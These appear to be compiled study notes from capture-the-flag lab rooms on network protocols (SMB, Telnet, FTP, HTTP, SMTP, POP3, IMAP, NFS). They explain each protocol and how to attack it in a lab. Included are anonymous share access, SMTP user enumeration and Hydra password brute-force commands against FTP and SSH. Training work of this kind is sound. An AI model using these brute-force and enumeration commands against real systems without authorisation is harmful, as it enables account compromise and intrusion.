<p>SMB and NFS are two network file sharing protocols. The main difference between the two is that SMB is used by Windows and NFS is used by Unix. SMB is a network file sharing protocol that allows applications to read and write to files and to request services from server programs in a computer network. NFS is a network file system protocol that allows a user on a client computer to access files over a network in the same way they would access a local storage file.</p>

<p>Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!</p>
<p>Enumeration</p>
<p>Enumeration is the process of gathering information on a target in order to find potential attack vectors and aid in exploitation.</p>
<p>This process is essential for an attack to be successful, as wasting time with exploits that either don't work or can crash the system can be a waste of energy. Enumeration can be used to gather usernames, passwords, network information, hostnames, application data, services, or any other information that may be valuable to an attacker.</p>
<p>SMB</p>
<p>Typically, there are SMB share drives on a server that can be connected to and used to view or transfer files. SMB can often be a great starting point for an attacker looking to discover sensitive information — you'd be surprised what is sometimes included on these shares.</p>
<p>Port Scanning</p>
<p>The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, applications, structure and operating system of the target machine.</p>
<p>If you haven't already looked at port scanning, I recommend checking out the Nmap room here.</p>
<p>Enum4Linux</p>
<p>Enum4linux is a tool used to enumerate SMB shares on both Windows and Linux systems. It is basically a wrapper around the tools in the Samba package and makes it easy to quickly extract information from the target pertaining to SMB. It's installed by default on Parrot and Kali, however if you need to install it, you can do so from the official github.</p>
<p>The syntax of Enum4Linux is nice and simple: &quot;enum4linux [options] ip&quot;</p>
<div class="table-wrapper"><table><thead><tr><th>Tag</th><th>Function</th></tr></thead><tbody>
<tr><td>-U</td><td>get userlist</td></tr>
<tr><td>-M</td><td>get machine list</td></tr>
<tr><td>-N</td><td>get namelist dump (different from -U and -M)</td></tr>
<tr><td>-S</td><td>get sharelist</td></tr>
<tr><td>-P</td><td>get password policy information</td></tr>
<tr><td>-G</td><td>get group and member list</td></tr>
<tr><td>-a</td><td>all of the above (full basic enumeration)</td></tr>
</tbody></table>
</div>
<p>Now we understand our enumeration tools, let's get started!</p>
<p>Types of SMB Exploit</p>
<p>While there are vulnerabilities such as CVE-2017-7494 that can allow remote code execution by exploiting SMB, you're more likely to encounter a situation where the best way into a system is due to misconfigurations in the system. In this case, we're going to be exploiting anonymous SMB share access- a common misconfiguration that can allow us to gain information that will lead to a shell.</p>
<p>Method Breakdown</p>
<p>So, from our enumeration stage, we know:</p>
<pre><code>- The SMB share location

- The name of an interesting SMB share
</code></pre>
<p>SMBClient</p>
<p>Because we're trying to access an SMB share, we need a client to access resources on servers. We will be using SMBClient because it's part of the default samba suite. While it is available by default on Kali and Parrot, if you do need to install it, you can find the documentation here.</p>
<p>We can remotely access the SMB share using the syntax:</p>
<p>smbclient //[IP]/[SHARE]</p>
<p>Followed by the tags:</p>
<p>-U [name] : to specify the user</p>
<p>-p [port] : to specify the port</p>
<p>Got it? Okay, let's do this!</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="basic-telnet"><a class="header" href="#basic-telnet">Basic Telnet</a></h1>
<p>What is Telnet?</p>
<p>Telnet is an application protocol which allows you, with the use of a telnet client, to connect to and execute commands on a remote machine that's hosting a telnet server.</p>
<p>The telnet client will establish a connection with the server. The client will then become a virtual terminal- allowing you to interact with the remote host.</p>
<p>Replacement</p>
<p>Telnet sends all messages in clear text and has no specific security mechanisms. Thus, in many applications and services, Telnet has been replaced by SSH in most implementations.</p>
<p>How does Telnet work?</p>
<p>The user connects to the server by using the Telnet protocol, which means entering &quot;telnet&quot; into a command prompt. The user then executes commands on the server by using specific Telnet commands in the Telnet prompt. You can connect to a telnet server with the following syntax: &quot;telnet [ip] [port]&quot;</p>
<p>What runs Telnet?</p>
<p>Telnet is a protocol that is used on the Internet or local area networks to provide a bidirectional interactive text-oriented communication facility using a virtual terminal connection. User data is interspersed in-band with Telnet control information in an 8-bit byte oriented data connection over the Transmission Control Protocol (TCP).</p>
<p>Lets Get Started</p>
<p>Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!</p>
<p>Enumeration</p>
<p>We've already seen how key enumeration can be in exploiting a misconfigured network service. However, vulnerabilities that could be potentially trivial to exploit don't always jump out at us. For that reason, especially when it comes to enumerating network services, we need to be thorough in our method. </p>
<p>Port Scanning</p>
<p>Let's start out the same way we usually do, a port scan, to find out as much information as we can about the services, applications, structure and operating system of the target machine. Scan the machine with nmap.</p>
<p>Output</p>
<p>Let's see what's going on on the target server...</p>
<p>Types of Telnet Exploit</p>
<p>Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:</p>
<p>https://www.cvedetails.com/
https://cve.mitre.org/
A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.</p>
<p>However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it.</p>
<p>Method Breakdown</p>
<p>So, from our enumeration stage, we know:</p>
<pre><code>- There is a poorly hidden telnet service running on this machine

- The service itself is marked &quot;backdoor&quot;

- We have possible username of &quot;Skidy&quot; implicated
</code></pre>
<p>Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!</p>
<p>Connecting to Telnet</p>
<p>You can connect to a telnet server with the following syntax:</p>
<pre><code>&quot;telnet [ip] [port]&quot;
</code></pre>
<p>We're going to need to keep this in mind as we try and exploit this machine.</p>
<p>What is a Reverse Shell?</p>
<p>A &quot;shell&quot; can simply be described as a piece of code or program which can be used to gain code or command execution on a device.</p>
<p>A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.</p>
<p>The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.</p>
<p>The Telnet protocol is an application layer protocol used to connect to a virtual terminal of another computer. Using Telnet, a user can log into another computer and access its terminal (console) to run programs, start batch processes, and perform system administration tasks remotely.</p>
<p>Telnet protocol is relatively simple. When a user connects, they will be asked for a username and password. Upon correct authentication, the user will access the remote system’s terminal. Unfortunately, all this communication between the Telnet client and the Telnet server is not encrypted, making it an easy target for attackers.</p>
<p>A Telnet server uses the Telnet protocol to listen for incoming connections on port 23. (Please note that the Telnet port is not open on the target VM.) Let’s consider the example shown below. A user is connecting to the telnetd, a Telnet server. The steps are as follows:</p>
<p>First, he is asked to provide his login name (username). We can see the user entering frank.
Then, he is asked for the password, D2xc9CgD. The password is not shown on the screen; however, we display it below for demonstration purposes.
Once the system checks his login credentials, he is greeted with a welcome message.
And the remote server grants him a command prompt, frank@bento:~$. The $ indicates that this is not a root terminal.

Although Telnet gave us access to the remote system’s terminal in no time, it is not a reliable protocol for remote administration as all the data are sent in cleartext. In the figure below, we captured the traffic generated by Telnet, and it was so easy to find the password. The figure below shows the ASCII data exchanged between our computer and the remote system. The text in red is the text that we are sending to the remote system, while the text in blue is the text that the remote system is sending. Notice how the user name was sent back (echoed at us to display them in our terminal); however, the password was not. In other words, if someone is watching us type, they won’t be able to see the password characters on the screen.</p>
<p>Telnet is no longer considered a secure option, especially that anyone capturing your network traffic will be able to discover your usernames and passwords, which would grant them access to the remote system. The secure alternative is SSH, which we present in the next room.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="basic-ftp"><a class="header" href="#basic-ftp">Basic FTP</a></h1>
<p>What is FTP?</p>
<p>File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.</p>
<p>How does FTP work?</p>
<p>A typical FTP session operates using two channels:
a command (sometimes called the control) channel
a data channel.
As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.</p>
<p>FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.</p>
<p>While the session is open, the client may execute FTP commands on the server.</p>
<p>Active vs Passive</p>
<p>The FTP server may support either Active or Passive connections, or both. </p>
<p>In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 
In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it. 
This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections.
More Details:</p>
<p>You can find more details on the technical function, and implementation of, FTP on the Internet Engineering Task Force website: https://www.ietf.org/rfc/rfc959.txt. The IETF is one of a number of standards agencies, who define and regulate internet standards.</p>
<p>Lets Get Started</p>
<p>Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!</p>
<p>Enumeration</p>
<p>By now, I don't think I need to explain any further how enumeration is key when attacking network services and protocols. You should, by now, have enough experience with nmap to be able to port scan effectively. If you get stuck using any tool- you can always use &quot;tool [-h / -help / --help]&quot; to find out more about it's function and syntax. Equally, man pages are extremely useful for this purpose. They can be reached using &quot;man [tool]&quot;.</p>
<p>Method
We're going to be exploiting an anonymous FTP login, to see what files we can access- and if they contain any information that might allow us to pop a shell on the system. This is a common pathway in CTF challenges, and mimics a real-life careless implementation of FTP servers.</p>
<p>Resources</p>
<p>As we're going to be logging in to an FTP server, we will need to make sure an FTP client is installed on the system. There should be one installed by default on most Linux operating systems, such as Kali or Parrot OS. You can test if there is one by typing &quot;ftp&quot; into the console. If you're brought to a prompt that says: &quot;ftp&gt;&quot;, then you have a working FTP client on your system. If not, it's a simple matter of using &quot;sudo apt install ftp&quot; to install one.</p>
<p>Alternative Enumeration Methods
It's worth noting  that some vulnerable versions of in.ftpd and some other FTP server variants return different responses to the &quot;cwd&quot; command for home directories which exist and those that don’t. This can be exploited because you can issue cwd commands before authentication, and if there's a home directory- there is more than likely a user account to go with it. While this bug is found mainly within legacy systems, it's worth knowing about, as a way to exploit FTP.</p>
<p>This vulnerability is documented at: https://www.exploit-db.com/exploits/20745 </p>
<p>Types of FTP Exploit</p>
<p>Similarly to Telnet, when using FTP both the command and data channels are unencrypted. Any data sent over these channels can be intercepted and read.</p>
<p>With data from FTP being sent in plaintext, if a man-in-the-middle attack took place an attacker could reveal anything sent through this protocol (such as passwords). An article written by JSCape demonstrates and explains this process using ARP-Poisoning to trick a victim into sending sensitive information to an attacker, rather than a legitimate source.</p>
<p>When looking at an FTP server from the position we find ourselves in for this machine, an avenue we can exploit is weak or default password configurations.</p>
<p>Method Breakdown</p>
<p>So, from our enumeration stage, we know:</p>
<pre><code>- There is an FTP server running on this machine

- We have a possible username
</code></pre>
<p>Using this information, let's try and bruteforce the password of the FTP Server.</p>
<p>Hydra</p>
<p>Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub here.</p>
<p>The syntax for the command we're going to use to find the passwords is this:</p>
<p>&quot;hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp&quot;
Let's break it down:</p>
<div class="table-wrapper"><table><thead><tr><th>Section</th><th>Function</th></tr></thead><tbody>
<tr><td>hydra</td><td>Runs the hydra tool</td></tr>
<tr><td>-t 4</td><td>Number of parallel connections per target</td></tr>
<tr><td>-l [user]</td><td>Points to the user who's account you're trying to compromise</td></tr>
<tr><td>-P [path to dictionary]</td><td>Points to the file containing the list of possible passwords</td></tr>
<tr><td>-vV</td><td>Sets verbose mode to very verbose, shows the login+pass combination for each attempt</td></tr>
<tr><td>[machine IP]</td><td>The IP address of the target machine</td></tr>
<tr><td>ftp / protocol</td><td>Sets the protocol</td></tr>
</tbody></table>
</div>
<p>Let's crack some passwords!</p>
<p>File Transfer Protocol (FTP) was developed to make the transfer of files between different computers with different systems efficient.</p>
<p>FTP also sends and receives data as cleartext; therefore, we can use Telnet (or Netcat) to communicate with an FTP server and act as an FTP client. In the example below, we carried out the following steps:</p>
<p>We connected to an FTP server using a Telnet client. Since FTP servers listen on port 21 by default, we had to specify to our Telnet client to attempt connection to port 21 instead of the default Telnet port.
We needed to provide the username with the command USER frank.
Then, we provided the password with the command PASS D2xc9CgD.
Because we supplied the correct username and password, we got logged in.
A command like STAT can provide some added information. The SYST command shows the System Type of the target (UNIX in this case). PASV switches the mode to passive. It is worth noting that there are two modes for FTP:</p>
<p>Active: In the active mode, the data is sent over a separate channel originating from the FTP server’s port 20.
Passive: In the passive mode, the data is sent over a separate channel originating from an FTP client’s port above port number 1023.
The command TYPE A switches the file transfer mode to ASCII, while TYPE I switches the file transfer mode to binary. However, we cannot transfer a file using a simple client such as Telnet because FTP creates a separate connection for file transfer.</p>

The image below shows how an actual file transfer would be conducted using FTP. To keep things simple in this figure, let’s only focus on the fact that the FTP client will initiate a connection to an FTP server, which listens on port 21 by default. All commands will be sent over the control channel. Once the client requests a file, another TCP connection will be established between them. (The details of establishing the data connection/channel is beyond the scope of this room.)</p>
<p>Considering the sophistication of the data transfer over FTP, let’s use an actual FTP client to download a text file. We only needed a small number of commands to retrieve the file. After logging in successfully, we get the FTP prompt, ftp&gt;, to execute various FTP commands. We used ls to list the files and learn the file name; then, we switched to ascii since it is a text file (not binary). Finally, get FILENAME made the client and server establish another channel for file transfer.</p>

FTP servers and FTP clients use the FTP protocol. There are various FTP server software that you can select from if you want to host your FTP file server. Examples of FTP server software include:</p>
<p>vsftpd
ProFTPD
uFTP
For FTP clients, in addition to the console FTP client commonly found on Linux systems, you can use an FTP client with GUI such as FileZilla. Some web browsers also support FTP protocol.</p>
<p>Because FTP sends the login credentials along with the commands and files in cleartext, FTP traffic can be an easy target for attackers.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="basic-http"><a class="header" href="#basic-http">Basic HTTP</a></h1>
<p>Hypertext Transfer Protocol (HTTP) is the protocol used to transfer web pages. Your web browser connects to the webserver and uses HTTP to request HTML pages and images among other files and submit forms and upload various files. Anytime you browse the World Wide Web (WWW), you are certainly using the HTTP protocol.</p>
<p>The image below shows a client requesting the HTML page index.html, which the webserver provides. Then the client requests an image, logo.jpg, and the web server sends it.</p>
<p>HTTP sends and receives data as cleartext (not encrypted); therefore, you can use a simple tool, such as Telnet (or Netcat), to communicate with a web server and act as a “web browser”. The key difference is that you need to input the HTTP-related commands instead of the web browser doing that for you.</p>
<p>In the following example, we will see how we can request a page from a web server; moreover, we will discover the webserver version. To accomplish this, we will use the Telnet client. We chose it because Telnet is a simple protocol; furthermore, it uses cleartext for communication. We will use telnet instead of a web browser to request a file from the webserver. The steps will be as follows:</p>
<p>First, we connect to port 80 using telnet 10.10.176.214 80.
Next, we need to type GET /index.html HTTP/1.1 to retrieve the page index.html or GET / HTTP/1.1 to retrieve the default page.
Finally, you need to provide some value for the host like host: telnet and hit the Enter/Return key twice.
In the console output below, we could recover the requested page along with a trove of information not usually displayed by the web browser. If the page we requested is not found, we get error 404.</p>

Of particular interest in the output above is that the user needs only to type a couple of commands to get the page they need: GET /index.html HTTP/1.1 followed by host: telnet.
<p>We need an HTTP server (webserver) and an HTTP client (web browser) to use the HTTP protocol. The web server will “serve” a specific set of files to the requesting web browser.</p>
<p>Three popular choices for HTTP servers are:</p>
<p>Apache
Internet Information Services (IIS)
nginx
Apache and Nginx are free and open-source software. However, IIS is closed source software and requires paying for a license.</p>
<p>There are many web browsers available. At the time of writing, the most popular web browsers are:</p>
<p>Chrome by Google
Edge by Microsoft
Firefox by Mozilla
Safari by Apple.
Web browsers are generally free to install and use; furthermore, tech giants battle for a higher market share for their browsers.</p>

<p>Email is one of the most used services on the Internet. There are various configurations for email servers; for instance, you may set up an email system to allow local users to exchange emails with each other with no access to the Internet. However, we will consider the more general setup where different email servers connect over the Internet.</p>
<p>Email delivery over the Internet requires the following components:</p>
<p>Mail Submission Agent (MSA)
Mail Transfer Agent (MTA)
Mail Delivery Agent (MDA)
Mail User Agent (MUA)
The above four terms may look cryptic, but they are more straightforward than they appear. We will explain these terms using the figure below.</p>
<p>The figure shows the following five steps that an email needs to go through to reach the recipient’s inbox:</p>
<p>A Mail User Agent (MUA), or simply an email client, has an email message to be sent. The MUA connects to a Mail Submission Agent (MSA) to send its message.
The MSA receives the message, checks for any errors before transferring it to the Mail Transfer Agent (MTA) server, commonly hosted on the same server.
The MTA will send the email message to the MTA of the recipient. The MTA can also function as a Mail Submission Agent (MSA).
A typical setup would have the MTA server also functioning as a Mail Delivery Agent (MDA).
The recipient will collect its email from the MDA using their email client.
If the above steps sound confusing, consider the following analogy:</p>
<p>You (MUA) want to send postal mail.
The post office employee (MSA) checks the postal mail for any issues before your local post office (MTA) accepts it.
The local post office checks the mail destination and sends it to the post office (MTA) in the correct country.
The post office (MTA) delivers the mail to the recipient mailbox (MDA).
The recipient (MUA) regularly checks the mailbox for new mail. They notice the new mail, and they take it.
In the same way, we need to follow a protocol to communicate with an HTTP server, and we need to rely on email protocols to talk with an MTA and an MDA. The protocols are:</p>
<p>Simple Mail Transfer Protocol (SMTP)
Post Office Protocol version 3 (POP3) or Internet Message Access Protocol (IMAP)
We explain SMTP in this task and elaborate on POP3 and IMAP in the following two tasks.</p>
<p>Simple Mail Transfer Protocol (SMTP) is used to communicate with an MTA server. Because SMTP uses cleartext, where all commands are sent without encryption, we can use a basic Telnet client to connect to an SMTP server and act as an email client (MUA) sending a message.</p>
<p>SMTP server listens on port 25 by default. To see basic communication with an SMTP server, we used Telnet to connect to it. Once connected, we issue helo hostname and then start typing our email.</p>

After helo, we issue mail from:, rcpt to: to indicate the sender and the recipient. When we send our email message, we issue the command data and type our message. We issue <CR><LF>.<CR><LF> (or Enter . Enter to put it in simpler terms). The SMTP server now queues the message.</p>
<p>Generally speaking, we don’t need to memorize SMTP commands. The console output above aims to help better explain what a typical mail client does when it uses SMTP.</p>
<p>What is SMTP?</p>
<p>SMTP stands for &quot;Simple Mail Transfer Protocol&quot;. It is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP. Together they allow the user to send outgoing mail and retrieve incoming mail, respectively.</p>
<p>The SMTP server performs three basic functions:</p>
<p>It verifies who is sending emails through the SMTP server.
It sends the outgoing mail
If the outgoing mail can't be delivered it sends the message back to the sender
Most people will have encountered SMTP when configuring a new email address on some third-party email clients, such as Thunderbird; as when you configure a new email client, you will need to configure the SMTP server configuration in order to send outgoing emails.
POP and IMAP</p>
<p>POP, or &quot;Post Office Protocol&quot; and IMAP, &quot;Internet Message Access Protocol&quot; are both email protocols who are responsible for the transfer of email between a client and a mail server. The main differences is in POP's more simplistic approach of downloading the inbox from the mail server, to the client. Where IMAP will synchronise the current inbox, with new mail on the server, downloading anything new. This means that changes to the inbox made on one computer, over IMAP, will persist if you then synchronise the inbox from another computer. The POP/IMAP server is responsible for fulfiling this process.</p>
<p>How does SMTP work?</p>
<p>Email delivery functions much the same as the physical mail delivery system. The user will supply the email (a letter) and a service (the postal delivery service), and through a series of steps- will deliver it to the recipients inbox (postbox). The role of the SMTP server in this service, is to act as the sorting office, the email (letter) is picked up and sent to this server, which then directs it to the recipient.
We can map the journey of an email from your computer to the recipient’s like this:</p>
<ol>
<li>
<p>The mail user agent, which is either your email client or an external program. connects to the SMTP server of your domain, e.g. smtp.google.com. This initiates the SMTP handshake. This connection works over the SMTP port- which is usually 25. Once these connections have been made and validated, the SMTP session starts.</p>
</li>
<li>
<p>The process of sending mail can now begin. The client first submits the sender, and recipient's email address- the body of the email and any attachments, to the server.</p>
</li>
<li>
<p>The SMTP server then checks whether the domain name of the recipient and the sender is the same.</p>
</li>
<li>
<p>The SMTP server of the sender will make a connection to the recipient's SMTP server before relaying the email. If the recipient's server can't be accessed, or is not available- the Email gets put into an SMTP queue.</p>
</li>
<li>
<p>Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognised. The server will then forward the email to the POP or IMAP server, as shown in the diagram above.</p>
</li>
<li>
<p>The E-Mail will then show up in the recipient's inbox.</p>
</li>
</ol>
<p>This is a very simplified version of the process, and there are a lot of sub-protocols, communications and details that haven't been included. If you're looking to learn more about this topic, this is a really friendly to read breakdown of the finer technical details- I actually used it to write this breakdown:</p>
<p>https://computer.howstuffworks.com/e-mail-messaging/email3.htm</p>
<p>What runs SMTP?</p>
<p>SMTP Server software is readily available on Windows server platforms, with many other variants of SMTP being available to run on Linux.</p>
<p>More Information:</p>
<p>Here is a resource that explain the technical implementation, and working of, SMTP in more detail than I have covered here.</p>
<p>https://www.afternerd.com/blog/smtp/</p>
<p>Lets Get Started</p>
<p>Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!</p>
<p>Enumerating Server Details</p>
<p>Poorly configured or vulnerable mail servers can often provide an initial foothold into a network, but prior to launching an attack, we want to fingerprint the server to make our targeting as precise as possible. We're going to use the &quot;smtp_version&quot; module in MetaSploit to do this. As its name implies, it will scan a range of IP addresses and determine the version of any mail servers it encounters.</p>
<p>Enumerating Users from SMTP</p>
<p>The SMTP service has two internal commands that allow the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of user’s aliases and lists of e-mail (mailing lists). Using these SMTP commands, we can reveal a list of valid users</p>
<p>We can do this manually, over a telnet connection- however Metasploit comes to the rescue again, providing a handy module appropriately called &quot;smtp_enum&quot; that will do the legwork for us! Using the module is a simple matter of feeding it a host or range of hosts to scan and a wordlist containing usernames to enumerate.</p>
<p>Requirements
As we're going to be using Metasploit for this, it's important that you have Metasploit installed. It is by default on both Kali Linux and Parrot OS; however, it's always worth doing a quick update to make sure that you're on the latest version before launching any attacks. You can do this with a simple &quot;sudo apt update&quot;, and accompanying upgrade- if any are required.</p>
<p>Alternatives</p>
<p>It's worth noting that this enumeration technique will work for the majority of SMTP configurations; however there are other, non-metasploit tools such as smtp-user-enum that work even better for enumerating OS-level user accounts on Solaris via the SMTP service. Enumeration is performed by inspecting the responses to VRFY, EXPN, and RCPT TO commands.</p>
<p>This technique could be adapted in future to work against other vulnerable SMTP daemons, but this hasn’t been done as of the time of writing. It's an alternative that's worth keeping in mind if you're trying to distance yourself from using Metasploit e.g. in preparation for OSCP.</p>
<p>Now we've covered the theory. Let's get going!</p>
<p>What do we know?</p>
<p>Okay, at the end of our Enumeration section we have a few vital pieces of information:</p>
<ol>
<li>
<p>A user account name</p>
</li>
<li>
<p>The type of SMTP server and Operating System running.</p>
</li>
</ol>
<p>We know from our port scan, that the only other open port on this machine is an SSH login. We're going to use this information to try and bruteforce the password of the SSH login for our user using Hydra.</p>
<p>Preparation</p>
<p>It's advisable that you exit Metasploit to continue the exploitation of this section of the room. Secondly, it's useful to keep a note of the information you gathered during the enumeration stage, to aid in the exploitation.</p>
<p>Hydra</p>
<p>There is a wide array of customisability when it comes to using Hydra, and it allows for adaptive password attacks against of many different services, including SSH. Hydra comes by default on both Parrot and Kali, however if you need it, you can find the GitHub here.</p>
<p>Hydra uses dictionary attacks primarily, both Kali Linux and Parrot OS have many different wordlists in the &quot;/usr/share/wordlists&quot; directory- if you'd like to browse and find a different wordlists to the widely used &quot;rockyou.txt&quot;. Likewise I recommend checking out SecLists for a wider array of other wordlists that are extremely useful for all sorts of purposes, other than just password cracking. E.g. subdomain enumeration</p>
<p>The syntax for the command we're going to use to find the passwords is this:</p>
<p>&quot;hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV MACHINE_IP ssh&quot;
Let's break it down:</p>
<p>SECTION	FUNCTION
hydra	Runs the hydra tool
-t 16
Number of parallel connections per target
-l [user]	Points to the user who's account you're trying to compromise
-P [path to dictionary]	Points to the file containing the list of possible passwords
-vV
Sets verbose mode to very verbose, shows the login+pass combination for each attempt
[machine IP]	The IP address of the target machine
ssh / protocol	Sets the protocol</p>
<p>Looks like we're ready to rock n roll!</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="basic-pop3"><a class="header" href="#basic-pop3">Basic POP3</a></h1>
<p>Post Office Protocol version 3 (POP3) is a protocol used to download the email messages from a Mail Delivery Agent (MDA) server, as shown in the figure below. The mail client connects to the POP3 server, authenticates, downloads the new email messages before (optionally) deleting them.</p>
<p>The example below shows what a POP3 session would look like if conducted via a Telnet client. First, the user connects to the POP3 server at the POP3 default port 110. Authentication is required to access the email messages; the user authenticates by providing his username USER frank and password PASS D2xc9CgD. Using the command STAT, we get the reply +OK 1 179; based on RFC 1939, a positive response to STAT has the format +OK nn mm, where nn is the number of email messages in the inbox, and mm is the size of the inbox in octets (byte). The command LIST provided a list of new messages on the server, and RETR 1 retrieved the first message in the list. We don’t need to concern ourselves with memorizing these commands; however, it is helpful to strengthen our understanding of such protocol.</p>

The example above shows that the commands are sent in cleartext. Using Telnet was enough to authenticate and retrieve an email message. As the username and password are sent in cleartext, any third party watching the network traffic can steal the login credentials.</p>
<p>In general, your mail client (MUA) will connect to the POP3 server (MDA), authenticate, and download the messages. Although the communication using the POP3 protocol will be hidden behind a sleek interface, similar commands will be issued, as shown in the Telnet session above.</p>
<p>Based on the default settings, the mail client deletes the mail message after it downloads it. The default behaviour can be changed from the mail client settings if you wish to download the emails again from another mail client. Accessing the same mail account via multiple clients using POP3 is usually not very convenient as one would lose track of read and unread messages. To keep all mailboxes synchronized, we need to consider other protocols, such as IMAP.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="basic-imap"><a class="header" href="#basic-imap">Basic IMAP</a></h1>
<p>Internet Message Access Protocol (IMAP) is more sophisticated than POP3. IMAP makes it possible to keep your email synchronized across multiple devices (and mail clients). In other words, if you mark an email message as read when checking your email on your smartphone, the change will be saved on the IMAP server (MDA) and replicated on your laptop when you synchronize your inbox.</p>
<p>Let’s take a look at sample IMAP commands. In the console output below, we use Telnet to connect to the IMAP server’s default port, and then we authenticate using LOGIN username password. IMAP requires each command to be preceded by a random string to be able to track the reply. So we added c1, then c2, and so on. Then we listed our mail folders using LIST &quot;&quot; &quot;*&quot;, before checking if we have any new messages in the inbox using EXAMINE INBOX. We don’t need to memorize these commands; however, we are simply providing the example below to give a vivid image of what happens when the mail client communicates with an IMAP server.</p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="basic-nfs"><a class="header" href="#basic-nfs">Basic NFS</a></h1>
<p>What is NFS?</p>
<p>NFS stands for &quot;Network File System&quot; and allows a system to share directories and files with others over a network. By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.</p>
<p>How does NFS work?</p>
<p>Shared File
We don't need to understand the technical exchange in too much detail to be able to exploit NFS effectively- however if this is something that interests you, I would recommend this resource: https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html</p>
<p>First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device. The mount service will then act to connect to the relevant mount daemon using RPC.</p>
<p>The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.</p>
<p>If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:</p>
<p>The file handle
The name of the file to be accessed
The user's, user ID
The user's group ID
These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.</p>
<p>What runs NFS?</p>
<p>Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.</p>
<p>A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.</p>
<p>More Information:</p>
<p>Here are some resources that explain the technical implementation, and working of, NFS in more detail than I have covered here.</p>
<p>https://www.datto.com/library/what-is-nfs-file-share</p>
<p>http://nfs.sourceforge.net/</p>
<p>https://wiki.archlinux.org/index.php/NFS</p>
<p>Let's Get Started</p>
<p>Before we begin, make sure to deploy the room and give it some time to boot. Please be aware - this can take up to five minutes so be patient!</p>
<p>What is Enumeration?</p>
<p>Enumeration is defined as &quot;a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system.&quot; - Infosec Institute. It is a critical phase when considering how to enumerate and exploit a remote machine - as the information you will use to inform your attacks will come from this stage</p>
<p>Requirements</p>
<p>In order to do a more advanced enumeration of the NFS server, and shares- we're going to need a few tools. The first of which is key to interacting with any NFS share from your local machine: nfs-common.</p>
<p>NFS-Common</p>
<p>It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs. Primarily, we are concerned with &quot;showmount&quot; and &quot;mount.nfs&quot; as these are going to be most useful to us when it comes to extracting information from the NFS share. If you'd like more information about this package, feel free to read: https://packages.ubuntu.com/jammy/nfs-common.</p>
<p>You can install nfs-common using &quot;sudo apt install nfs-common&quot;, it is part of the default repositories for most Linux distributions such as the Kali Remote Machine or AttackBox that is provided to TryHackMe.</p>
<p>Port Scanning</p>
<p>Port scanning has been covered many times before, so I'll only cover the basics that you need for this room here. If you'd like to learn more about nmap in more detail please have a look at the nmap room.</p>
<p>The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, open ports and operating system of the target machine. You can go as in-depth as you like on this, however, I suggest using nmap with the -A and -p- tags.</p>
<p>Mounting NFS shares</p>
<p>Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed. You can create
this folder anywhere on your system. Once you've created this mount point, you can use the &quot;mount&quot; command to connect the NFS share to the mount point on your machine like so:</p>
<p>sudo mount -t nfs IP:share /tmp/mount/ -nolock</p>
<p>Let's break this down</p>
<p>Tag	Function
sudo	Run as root
mount	Execute the mount command
-t nfs	Type of device to mount, then specifying that it's NFS
IP:share	The IP Address of the NFS server, and the name of the share we wish to mount
-nolock	Specifies not to use NLM locking</p>
<p>Now we understand our tools, let's get started!</p>
<p>We're done, right?</p>
